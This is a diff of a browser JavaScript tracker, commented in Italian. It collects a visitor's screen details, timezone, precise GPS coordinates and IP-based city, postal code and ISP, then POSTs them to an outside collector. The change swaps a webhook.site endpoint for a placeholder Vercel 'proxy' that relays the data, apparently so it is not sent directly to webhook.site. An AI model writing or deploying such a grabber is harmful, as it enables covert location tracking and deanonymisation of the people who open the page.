@@ -37,63 +37,67 @@
           height: screen.height,
           availWidth: screen.availWidth,
           availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth
+          colorDepth: screen.colorDepth,
         },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toISOString(),
-        location: {},
-        ipInfo: {}
+        location: {
+          latitude: null,
+          longitude: null,
+          accuracy: null,
+        },
+        ipInfo: {
+          ip: null,
+          city: null,
+          region: null,
+          country: null,
+          postal: null,
+          org: null,
+        }
       };
 
+      // Geolocalizzazione (può fallire)
       if (navigator.geolocation) {
         try {
-          const pos = await new Promise((resolve, reject) =>
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
-          );
-          data.location = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          };
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
+          });
+          data.location.latitude = pos.coords.latitude;
+          data.location.longitude = pos.coords.longitude;
+          data.location.accuracy = pos.coords.accuracy;
         } catch (err) {
           console.warn("Geolocalizzazione non consentita o fallita:", err.message);
         }
       }
 
+      // Info IP e città
       try {
-        const res = await fetch("https://ipapi.co/json/");
-        if (res.ok) {
-          const ip = await res.json();
+        const ipRes = await fetch('https://ipapi.co/json/');
+        if (ipRes.ok) {
+          const ipJson = await ipRes.json();
           data.ipInfo = {
-            ip: ip.ip,
-            city: ip.city,
-            region: ip.region,
-            country: ip.country_name,
-            postal: ip.postal,
-            org: ip.org
+            ip: ipJson.ip,
+            city: ipJson.city,
+            region: ipJson.region,
+            country: ipJson.country_name,
+            postal: ipJson.postal,
+            org: ipJson.org,
           };
-        } else {
-          console.warn("Errore ipapi:", res.status);
         }
-      } catch (e) {
-        console.warn("Errore fetch IP:", e.message);
+      } catch (err) {
+        console.warn("Errore fetch IP:", err.message);
       }
 
       console.log("Dati raccolti:", data);
 
-      fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
+      // INVIO al tuo proxy server (NON direttamente a webhook.site!)
+      fetch('https://TUO-NOME.vercel.app/log', { // sostituisci con il tuo dominio Vercel
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       })
-      .then(res => {
-        console.log("Risposta webhook:", res.status);
-        return res.text();
-      })
-      .then(txt => console.log("Testo risposta:", txt))
-      .catch(err => console.error("Errore invio dati:", err));
+      .then(() => console.log("Dati inviati al proxy con successo"))
+      .catch(err => console.error("Errore invio:", err));
     }
 
     collectData();
